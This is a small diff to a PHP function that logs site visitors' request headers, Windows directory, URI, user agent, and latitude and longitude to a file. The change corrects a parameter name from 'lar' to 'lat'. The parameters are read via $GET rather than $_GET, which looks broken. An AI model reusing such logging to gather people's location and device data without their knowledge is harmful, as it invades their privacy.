@@ -75,7 +75,7 @@ function save_info_user() // OK
     "\nHTTP_SEC_CH_UA_PLATFORM:".$HTTP_SEC_CH_UA_PLATFORM.
     "\nWINDIR:".$WINDIR.
     "\nREQUEST_URI:".$REQUEST_URI.
-    "\nlat:".$GET['lar']."\nlong:".$GET['long'].
+    "\nlat:".$GET['lat']."\nlong:".$GET['long'].
     "\nuserAgent:".$GET['useragent'];
 
     fwrite($myFile,$information);
